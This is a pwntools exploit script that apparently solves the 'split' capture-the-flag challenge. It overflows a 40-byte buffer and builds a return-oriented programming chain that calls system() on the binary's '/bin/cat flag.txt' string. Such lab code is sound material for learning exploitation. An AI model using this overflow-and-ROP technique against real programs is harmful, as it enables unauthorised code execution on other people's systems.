from pwn import *

bin = './split'
elf = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 40

rop = ROP(elf)

ret_gadget = rop.find_gadget(['ret'])[0]
rop.raw(ret_gadget)
rop.system(next(elf.search(b'/bin/cat flag.txt')))

pprint(rop.dump())

payload = flat(
    {
        offset: rop.chain()
    }
)

io.sendlineafter(b'>', payload)

io.interactive()
